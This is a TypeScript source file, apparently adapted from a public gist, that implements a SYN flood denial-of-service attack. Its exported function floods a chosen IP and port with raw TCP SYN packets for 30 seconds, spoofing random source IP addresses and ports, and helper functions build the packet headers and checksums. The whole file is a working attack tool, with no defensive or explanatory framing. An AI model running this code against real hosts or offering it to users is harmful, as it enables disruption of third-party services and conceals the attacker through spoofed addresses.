// Based on: https://gist.github.com/zachary822/937ac765cc7d6ffbde06

// @ts-ignore
import raw = require('raw-socket');
// @ts-ignore
import randomIp = require('random-ipv4');
// @ts-ignore
import ipInt = require('ip-to-int');

import crypto = require('crypto');

const attackDuration = 30000;

// #TODO add ipv6 support
export async function synFlood (ip: string, port: number): Promise<void> {
  console.log(`starting syn flood on ${ip}:${port}`);
  const startTime = new Date();

  return new Promise((resolve) => {
    // not currently keeping track of which local ports are used
    // node uses random port for the udp socket if none is assigned so if it fails just try again
    let synRequest = () => {
      // wrapped in try catch for if not running as sudo this will fail
      try {
        let socket = raw.createSocket({
          protocol: raw.Protocol.TCP
        });

        // generate random port
        let randomPort = Math.floor((Math.random() * 65535) + 1);
        let randomSourceIp = randomIp();

        // generate the packet.
        let packet = genSynPacket(ipInt(randomSourceIp).toInt(), ipInt(ip).toInt(), randomPort, port);

        socket.on('error', () => { return; });
        socket.send(packet, 0, packet.length, ip, function () { return; });
      } catch (error) {
        console.error('failed synRequest', error.message);
        return;
      }

      if (Date.now() - startTime.getTime() < attackDuration) {
        setTimeout(synRequest, 1);
      } else {
        resolve();
        console.log(`stopping syn flood ${ip}:${port}`);
      }
    };

    synRequest();
  });
}

function genSynPacket (srcIp: number, dstIp: number, srcPort: number, dstPort: number): Buffer {
  // A scaffolding TCP syn packet. Notice all zeroes except a few options.
  // The "few options" include setting the SYN flags.
  // Don't change it if you don't know what you're doing.
  let p = new Buffer('0000000000000000000000005002200000000000', 'hex');

  // Need 4 random bytes as sequence. Needs to be random to avoid collision.
  // You can choose your own random source. I chose the crypto module.
  crypto.randomBytes(4).copy(p, 4);

  p.writeUInt16BE(srcPort, 0); // Write source port
  p.writeUInt16BE(dstPort, 2); // Write destination port

  // generate checksum with utility function
  // using a pseudo header and the tcp packet scaffold
  let sum = raw.createChecksum(genPseudoHeader(srcIp, dstIp, p.length), p);

  // writing the checksum back to the packet. Packet complete!
  p.writeUInt16BE(sum, 16);

  return p;
}

function genPseudoHeader (srcIp: number, dstIp: number, tcpPacketLength: number): Buffer {
  // new buffer of length 12. The pseudo-header length
  let pseudoHeader = new Buffer(12);
  // Important to fill with zeroes. Node.js does not zero the memory before creating the buffer.
  pseudoHeader.fill(0);
  pseudoHeader.writeUInt32BE(srcIp, 0); // write source ip, a 32 bit integer!
  pseudoHeader.writeUInt32BE(dstIp, 4); // write destination ip, a 32 bit integer!
  pseudoHeader.writeUInt8(6, 9); // specifies protocol. Here we write 6 for TCP. Other protocols have other numbers.
  // Write the TCP packet length of which we are generating a pseudo-header for.
  // Does not include the length of the psuedo-header.
  pseudoHeader.writeUInt16BE(tcpPacketLength, 10);
  return pseudoHeader;
}
